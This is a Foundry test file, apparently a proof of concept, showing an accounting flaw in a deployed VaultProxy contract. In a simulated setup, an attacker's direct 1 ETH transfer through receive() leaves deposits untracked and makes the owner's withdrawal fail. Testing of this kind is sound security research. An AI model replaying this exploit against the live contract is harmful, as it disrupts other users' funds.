// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0xbebbfe5b549f5db6e6c78ca97cac19d1fb03082c.sol";

contract VaultProxyDOS is Test {
    VaultProxy vault;
    address owner = makeAddr("owner");
    address attacker = makeAddr("attacker");

    function setUp() public {
        // Deploy contract with owner as both sender and origin
        vm.startPrank(owner, owner);
        vault = new VaultProxy();
        vm.stopPrank();

        // Fund attacker to simulate receipt via receive()
        vm.deal(attacker, 1 ether);
    }

    function test_WithdrawFailsOnUntrackedDeposits() public {
        console.log("--- BEFORE-Trigger Deposit State ---");
        uint256 preAttackerContractBalance = address(vault).balance;
        uint256 preAttackerTotalDeposits = vault.totalDeposits();
        uint256 preAttackerOwnerDeposit = vault.Deposits(owner);
        console.log("Actual Contract Balance (pre-attack):", preAttackerContractBalance);
        console.log("Total Deposits (pre-attack):", preAttackerTotalDeposits);
        console.log("Owner Deposit Record (pre-attack):", preAttackerOwnerDeposit);
        console.log("");

        // Trigger: Send 1 ETH directly to contract via receive()
        console.log("--- Trigger: Attacker sends 1 ETH via receive() ---");
        vm.prank(attacker);
        (bool sent, ) = address(vault).call{value: 1 ether}("");
        require(sent, "Failed ETH transfer");
        console.log("");

        console.log("--- AFTER-Trigger Deposit State ---");
        uint256 postAttackerContractBalance = address(vault).balance;
        uint256 postAttackerTotalDeposits = vault.totalDeposits();
        uint256 postAttackerOwnerDeposit = vault.Deposits(owner);
        console.log("Actual Contract Balance (post-attack):", postAttackerContractBalance);
        console.log("Total Deposits (post-attack):", postAttackerTotalDeposits);
        console.log("Owner Deposit Record (post-attack):", postAttackerOwnerDeposit);

        // Verify deposit tracking discrepancy
        bool balanceIncreased = postAttackerContractBalance > preAttackerContractBalance;
        bool depositsUntracked = (postAttackerTotalDeposits == preAttackerTotalDeposits) &&
                                 (postAttackerOwnerDeposit == preAttackerOwnerDeposit);
        console.log("Untracked deposit detected (expected true):", depositsUntracked);
        console.log("");

        // Record pre-withdrawal balances
        console.log("--- BEFORE-Trigger Withdrawal State ---");
        uint256 ownerBalanceBefore = owner.balance;
        uint256 contractBalanceBefore = postAttackerContractBalance; // Capture post-attack contract balance
        console.log("Owner Balance (pre-withdrawal):", ownerBalanceBefore);
        console.log("Contract Balance (pre-withdrawal):", contractBalanceBefore);
        console.log("");

        // Attempt to withdraw untracked ETH
        console.log("--- Trigger: Owner withdraws 1 ETH ---");
        vm.prank(owner);
        vault.withdraw(1 ether);
        console.log("");

        console.log("--- AFTER-Trigger Withdrawal State ---");
        uint256 ownerBalanceAfter = owner.balance;
        uint256 contractBalanceAfter = address(vault).balance;
        console.log("Owner Balance (post-withdrawal):", ownerBalanceAfter);
        console.log("Contract Balance (post-withdrawal):", contractBalanceAfter);

        // Verify withdrawal failure
        bool withdrawalFailed = (contractBalanceAfter == contractBalanceBefore) &&
                                (ownerBalanceAfter == ownerBalanceBefore);
        console.log("Withdrawal failed (expected true):", withdrawalFailed);

        // Final vulnerability assessment
        if (balanceIncreased && depositsUntracked && withdrawalFailed) {
            console.log("Vulnerability Exists: Contract accepted untracked deposit causing withdrawal failure");
        } else {
            console.log("Vulnerability not Exist: Deposit was tracked or withdrawal succeeded");
        }
    }
}